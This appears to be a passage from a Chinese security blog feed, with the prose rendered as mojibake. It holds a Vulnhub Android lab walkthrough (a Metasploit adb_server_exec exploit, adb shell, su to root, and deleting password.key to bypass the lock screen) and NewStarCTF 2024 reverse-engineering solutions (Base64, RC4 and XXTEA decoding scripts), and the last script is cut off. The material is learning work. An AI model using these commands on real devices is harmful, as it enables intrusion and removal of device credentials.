class="hljs-number">88.140</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç›®æ ‡å¼€æ”¾äº† 3 ä¸ªç«¯å£ï¼Œåˆ†åˆ«æ˜¯ 5555ã€8080ã€22000ï¼Œå…ˆçœ‹çœ‹ 8080 å§</p><p><img src="https://img.dkdun.cn/v1/2024/12/c8b2c3645dec92a9.png"></p><p>é¡µé¢æç¤ºè¯´æœ‰åé—¨ï¼Œç”¨ POST æ–¹å¼æäº¤</p><p><img src="https://img.dkdun.cn/v1/2024/12/533c79a56b1a35bb.png"></p><p>ç”¨ dirb æ‰«æä¸€ä¸‹ç›®å½•ï¼Œæ‰«å‡ºæ¥äº† <code>backdoor.php</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/48095127f1dcb6bc.png"></p><p>çœ‹æ¥æ˜¯ä¸ªå‡çš„åé—¨ï¼Œæ²¡ç”¨ã€‚ã€‚ã€‚</p><p><img src="https://img.dkdun.cn/v1/2024/12/a03c6db318dad930.png"></p><p>PHP CLI å’Œ DropBear ä¹Ÿæ²¡ä»€ä¹ˆç»“æœï¼Œé‚£ä¹ˆçœ‹çœ‹ 5555 ç«¯å£ï¼Œæœäº†ä¸€ä¸‹æ˜¯æŒ‡ android æœåŠ¡é»˜è®¤çš„ç›‘å¬ç«¯å£ï¼Œé€šå¸¸ä¸ä¸€äº›è®¾å¤‡ç®¡ç†å’Œè¿œç¨‹è®¿é—®æœåŠ¡ç›¸å…³è”ï¼Œç‰¹åˆ«æ˜¯ adb æœåŠ¡é»˜è®¤ä½¿ç”¨è¿™ä¸ªç«¯å£</p><p>ç®€å•ä»‹ç»ä¸€ä¸‹ adbï¼šAndroid Debug Bridgeï¼ˆå®‰å“è°ƒè¯•æ¡¥ï¼‰ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºé€šè¿‡ç”µè„‘ç«¯ä¸æ¨¡æ‹Ÿå™¨æˆ–è€…æ˜¯è®¾å¤‡ä¹‹é—´çš„äº¤äº’ã€‚</p><p>ç”¨ msf æ¥æœç´¢ä¸€ä¸‹ adb æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><img src="https://img.dkdun.cn/v1/2024/12/921633b6f851291e.png"></p><p>è°ƒç”¨æ¨¡å—ï¼Œç„¶åè¿›è¡Œåˆ©ç”¨</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/android/adb/adb_server_exec<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> RHOSTS 192.168.88.138 ï¼ˆç›®æ ‡IPï¼‰<br><span class="hljs-built_in">set</span> LHOST 192.168.88.140 ï¼ˆæœ¬æœºIPï¼‰<br><span class="hljs-built_in">run</span> <br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/52fb8adc6fe57576.png"></p><p>adb è¿æ¥ï¼Œç›´æ¥ getshell</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">adb</span> <span class="hljs-number">192.168.88.140</span><br>adb shell<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/2f0c334bc0eefed1.png"></p><p>ä½†æ˜¯æ˜¯æ™®é€šæƒé™ï¼Œé‚£ä¹ˆç›´æ¥ <code>su</code> è¿›å…¥ root æƒé™</p><p><img src="https://img.dkdun.cn/v1/2024/12/12e806c87ee042bd.png"></p><p>åˆ—å‡ºå½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œè®¿é—® <code>data</code> ç›®å½•ï¼ˆAndroid ä¸­é‡è¦çš„å­˜å‚¨æ•°æ®çš„ç›®å½•ï¼Œå­˜å‚¨ç€ç”¨æˆ·çš„æ‰€æœ‰ç¨‹åºç›¸å…³æ•°æ®ï¼‰ï¼Œå‘ç°æœ‰ rootï¼Œè¿›å…¥å¾—åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2024/12/a11f4b548e67a0b2.png"></p><p>å¾—åˆ°</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag:</span> ANDROID&#123;u_GOT_root_buddy&#125;<br></code></pre></td></tr></table></figure><p>æ¥éƒ½æ¥äº†ï¼Œå°è¯•ç€ç ´è§£ä¸€ä¸‹å¯†ç ï¼Œè¿›å…¥</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/system/</span><br></code></pre></td></tr></table></figure><p>å‘ç°äº† <code>password.key</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/f844809cb8685583.png"></p><p>ä½¿ç”¨æœ€æœ´ç´ çš„ç ´è§£åŠæ³•ï¼Œé‚£å°±æ˜¯ â€”- ç›´æ¥ç»™ä»–åˆ äº†ï¼ˆå˜»å˜»ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> password.key<br></code></pre></td></tr></table></figure><p>åˆ é™¤ä¹‹åæ‰“å¼€é¶æœºç•Œé¢ï¼Œç›´æ¥ enter å°±è§£é”äº†</p><p><img src="https://img.dkdun.cn/v1/2024/12/b192013003c50db4.png"></p><p>é€šè¿‡æŸ¥æ‰¾èµ„æ–™ï¼Œåˆå­¦ä¹ åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘å¿ƒç”šæ…°ï¼Œå–œæ¬¢è¿™æ ·çš„è‡ªå·± ï¼šï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week3</title>
    <link href="/2024/11/29/Week3/"/>
    <url>/2024/11/29/Week3/</url>
    
    <content type="html"><![CDATA[<p>ä¸è¡Œï¼Œæˆ‘å¥½èœå•ŠTT</p><p>æ›´ä¸€ä¸‹ï¼Œè‡ªç”±æ”¯é…çš„æ—¶é—´å¥½å°‘ï¼ˆ</p><p>æ—¶éš”åŠä¸ªå¤šæœˆï¼Œæˆ‘ç»ˆäºå°æœ‰æ—¶é—´æ›´æ–°äº†ï¼ï¼ï¼</p><span id="more"></span><h1 id="simpleAndroid"><a href="#simpleAndroid" class="headerlink" title="simpleAndroid"></a>simpleAndroid</h1><p>æŒ‰ç…§è€æ–¹æ³•çœ‹ <code>.xml</code> é‡Œ çš„ <code>activity</code> å†…å®¹æ‰¾ä¸»å‡½æ•°</p><p>ç»è¿‡ <code>CheckRoot.check()</code> åˆ¤æ–­åå°†æ­£ç¡®ç»“æœè¿”å›ï¼Œç„¶åè·³è½¬åˆ° <code>CheckActivity</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/71863c1f53ad4f50.png"></p><p>ç”¨ <code>isValidInput()</code> æ¥è¾“å…¥çš„æ ¼å¼è¿›è¡Œæ£€æµ‹ï¼Œé•¿åº¦å¿…é¡»ä¸º 24 ï¼Œå½¢å¼ä»¥ <code>flag&#123;</code> å¼€å¤´ <code>&#125;</code> ç»“å°¾ï¼Œç„¶åé€šè¿‡ <code>CheckData</code> æ¥è¿›è¡Œæ¯”è¾ƒ</p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç†Ÿæ‚‰çš„ <code>native</code>ï¼Œè¯´æ˜è¿™ä¸ªæ–¹æ³•å±äº <code>native</code> å±‚ï¼Œéœ€è¦å»é€† <code>so</code> æ–‡ä»¶äº†</p><p><img src="https://img.dkdun.cn/v1/2024/12/514232c5e71d14b0.png"></p><p>çœ‹äº†ä¸‹ wp å±…ç„¶å¯ä»¥ç›´æ¥æ”¹åç¼€ä¸º <code>.zip</code> æ‰¾ <code>so</code> æ–‡ä»¶ï¼ï¼ï¼é‚£æ‰€æœ‰ apk æ–‡ä»¶éƒ½å¯ä»¥å—ï¼Ÿï¼ä¸‹æ¬¡é‡åˆ°è¯•è¯•è¿™æ ·èµ°æ·å¾„(bushi)</p><p>æœç´¢ <code>CheckData</code> å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2024/12/ec471833977c7734.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  Class = _JNIEnv::FindClass(a1, <span class="hljs-string">&quot;com/example/simpleandroid/UseLess&quot;</span>);<br><span class="hljs-comment">//å¯»æ‰¾ Java çš„ UseLess ç±»</span><br>  StaticFieldID = _JNIEnv::GetStaticFieldID(a1, Class, <span class="hljs-string">&quot;CHAR_DATA&quot;</span>, <span class="hljs-string">&quot;Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//é€šè¿‡ GetStaticFieldID è·å–åˆ°äº†å­—æ®µ CHAR_DATA çš„ jfileID </span><br>  v27 = _JNIEnv::NewStringUTF(a1, <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span>);<br><span class="hljs-comment">//åˆ›å»ºçš„æ–°çš„ jString ç±»å‹å­—ç¬¦ä¸²</span><br>  _JNIEnv::SetStaticObjectField(a1, Class, StaticFieldID, v27);<br><span class="hljs-comment">//é€šè¿‡ SetStaticObjectField æŠŠ v27 èµ‹å€¼ç»™ Java çš„ CHAR_DATA å­—æ®µ</span><br><span class="hljs-comment">//ä¿®æ”¹äº† Java å±‚çš„ UseLess çš„ CHAR_DATA å­—æ®µ</span><br><br>  StaticMethodID = _JNIEnv::GetStaticMethodID(a1, Class, <span class="hljs-string">&quot;func&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//è·å– Java å±‚å‡½æ•° func çš„ jmethodID </span><br>  v9 = <span class="hljs-number">0</span>;<br>  v25 = _JNIEnv::CallStaticObjectMethod((_DWORD)a1, Class, StaticMethodID, v30, v3, v4, v7[<span class="hljs-number">0</span>]);<br><span class="hljs-comment">//é€šè¿‡ CallStaticObjectMethod å°†è¾“å…¥çš„ v30 ä¼ å…¥ func å‡½æ•° </span><br>  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, v25, <span class="hljs-number">0LL</span>);<br><span class="hljs-comment">//å°†ä¸Šé¢å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼èµ‹ç»™äº† StringUTFChars</span><br><span class="hljs-comment">//æŠŠè¾“å…¥ä½œä¸ºå‚æ•°ä¼ ç»™äº† Java å±‚çš„ func å‡½æ•°ï¼Œå¾—åˆ°è¿”å›å€¼</span><br></code></pre></td></tr></table></figure><p>å›åˆ° jad-gui çœ‹ <code>UseLess</code> ç±»ï¼Œæµç¨‹å¯ä»¥çœ‹å‡ºæ¥è¿›è¡Œ Base64 çš„å˜æ¢ï¼Œå› ä¸º <code>so</code> å¯¹äº <code>CHAR_DATA</code> è¿›è¡Œäº†æ›´æ”¹ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸€ä¸ªæ¢è¡¨çš„ Base64</p><p><img src="https://img.dkdun.cn/v1/2024/12/f4fb59bd9b159a1a.png"></p><p>è¾“å…¥é¦–å…ˆç»è¿‡æ¢è¡¨ Base64 çš„å˜åŒ–ï¼Œè¿›å…¥ <code>so</code> åŠ å¯†ã€‚é¦–å…ˆå‰åäº¤æ¢ä½ç½®ï¼Œå†è¿›è¡Œå¾ªç¯å³ç§» 4 ä½çš„æ“ä½œï¼Œæœ€åå’Œ<code>data_1</code> è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs smali">v35 = StringUTFChars;//base64 çš„ç»“æœèµ‹å€¼<br>v34 = -1<span class="hljs-class">LL;</span><br>v23 = __strlen_chk(StringUTFChars, -1<span class="hljs-class">LL);</span><br>v10 = v23;<br>v22 = v7;<br>v11 = &amp;v7[-((v23 + 15<span class="hljs-class">LL) &amp; 0xFFFFFFFFFFFFFFF0LL)];</span><br>v21 = v23;<br>for ( i = 0; i &lt; (int)v23; ++i )<br>  v11[i] = *(_BYTE *)(StringUTFChars + i);<br>for ( j = 0; ; ++j )<br>&#123;<br>  v8 = j;<br> <span class="hljs-built_in"> if </span>( j &gt;= (int)v23 / 2 )<br>    break;<br>  v5 = v11;<br>  v18 = v11[j];<br>  v11[j] = v11[v23 - j - 1];<br>  v5[v23 - j - 1] = v18;//å°† v11[j] å’Œ v11[v23-j-1] äº¤æ¢ä½ç½®<br>&#125;<br>v17 = v11;<br>v16 = v11;<br>v15 = &amp;v11[v10];<br>while ( v16 != v15 )<br>&#123;<br>  v14 = v16;<br>  *v16 = ((int)(unsigned __int8)*v16 &gt;&gt; 4) | (16 * *v16);//å¾ªç¯å³ç§» 4 ä½<br>  ++v16;<br>&#125;<br>for ( k = 0; k &lt; (int)v23; ++k )<br>&#123;<br> <span class="hljs-built_in"> if </span>( (unsigned __int8)v11[k] != data_1[k] )<br>  &#123;<br>    v33 = 0;<br>    v12 = 1;<br>   <span class="hljs-built_in"> return </span>v33;<br>  &#125;<br>&#125;<br>v33 = 1;<br>v12 = 1;<span class="hljs-built_in"></span><br><span class="hljs-built_in">return </span>v33;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥é€†å‘æµç¨‹å°±æ˜¯ï¼šå¾ªç¯ç§»åŠ¨ -&gt; äº¤æ¢ä½ç½® -&gt; base64</p><p>å°† <code>data_1</code> æ•°æ®æå–å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2024/12/cfa0a4036c1e3ed4.png"></p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>enc = [<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF4</span>,<br>       <span class="hljs-number">0x43</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x36</span>,<br>       <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>,<br>       <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x16</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">4</span> | enc[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">2</span>):<br>    tmp = enc[i]<br>    enc[i] = enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>]<br>    enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>] = tmp<br><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> enc])<br>CHAR_DATA = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>NewStringUTF = <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(result.translate(<span class="hljs-built_in">str</span>.maketrans(NewStringUTF, CHAR_DATA))))<br><br>&gt;&gt;<span class="hljs-string">b&#x27;flag&#123;android_is_simple!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="SecertsOfKawaii"><a href="#SecertsOfKawaii" class="headerlink" title="SecertsOfKawaii"></a>SecertsOfKawaii</h1><p>æŸ¥çœ‹ <code>MainActivity</code> ä»£ç ï¼Œçœ‹èµ·æ¥å¥½åƒè¢«æ··æ·†äº†ï¼Œä¹±ä¹±çš„</p><p><img src="https://img.dkdun.cn/v1/2024/12/8d9abae0ff32d920.png"></p><p>å¯ä»¥ä½¿ç”¨ jeb å»æ··æ·†ï¼Œè§£ææˆ Java ä»£ç ï¼ˆæ€ä¹ˆè¿™äº›å·¥å…·è¿™ä¹ˆå¼ºå•Šå•Šå•Šå•Šï¼‰</p><p><img src="https://img.dkdun.cn/v1/2024/12/996d02236c2e81ab.png"></p><p>å¾€ä¸‹çœ‹ä»£ç æµç¨‹ï¼ŒJava å±‚æœ‰ä¸€ä¸ª <code>RC4</code> åŠ å¯†ï¼Œ<code>key</code>æ˜¯ <code>rc4k4y</code>ï¼ŒåŠ å¯†å <code>Base64</code> ä¸€ä¸‹ä¼ åˆ° <code>so</code> å±‚ï¼Œå€¼åœ¨ <code>so</code> å±‚æ£€æŸ¥</p><p><img src="https://img.dkdun.cn/v1/2024/12/e545a4d1493aea08.png"></p><p><code>so</code> æ–‡ä»¶æœ‰å£³ï¼ˆä»¥åéƒ½ä¼šè®°ä½è¦å…ˆæŸ¥å£³äº†ï¼‰ï¼Œè„±å£³æŸ¥çœ‹</p><p><img src="https://img.dkdun.cn/v1/2024/12/ce34a0c04606ef30.png"></p><p>xxteaï¼ˆè®¨åŒ tea ç³»åˆ—ï¼ï¼ï¼ï¼‰ï¼Œå¯†é’¥æ˜¯ <code>meow~meow~tea~~~</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/7dfbf02378d099da.png"></p><p>æ‰€ä»¥æ•´ä¸ªæµç¨‹å°±æ˜¯ï¼š xxtea -&gt; base64 -&gt; rc4 </p><p> å†™ exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">uint32_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0xdeadbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 3) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 2)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-comment">//åˆå§‹åŒ– s ç›’</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span> *key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i,j,k;<br>    <span class="hljs-type">int</span> tmp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        sbox[i]=i;<br>    &#125;<br>    j=k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        tmp=sbox[i];<br>        j=(j+tmp+key[k])%<span class="hljs-number">256</span>;<br>        sbox[i]=sbox[j];<br>        sbox[j]=tmp;<br>        <span class="hljs-keyword">if</span>(++k&gt;=<span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)key))<br>            k=<span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//è§£å¯†rc4</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i, j, k, R, tmp;<br><br>    <span class="hljs-built_in">init_sbox</span>(key);<br><br>    j = k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)data); i++)<br>    &#123;<br>        j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        k = (k + sbox[j]) % <span class="hljs-number">256</span>;<br><br>        tmp = sbox[j];<br>        sbox[j] = sbox[k];<br>        sbox[k] = tmp;<br><br>        R = sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br><br>        data[i] ^= R;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//è§£å¯† tea</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//baseè§£å¯†</span><br><span class="hljs-type">char</span> base64[<span class="hljs-number">65</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decodeBase64</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">int</span> len, <span class="hljs-type">char</span> **in)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-type">char</span> ascill[<span 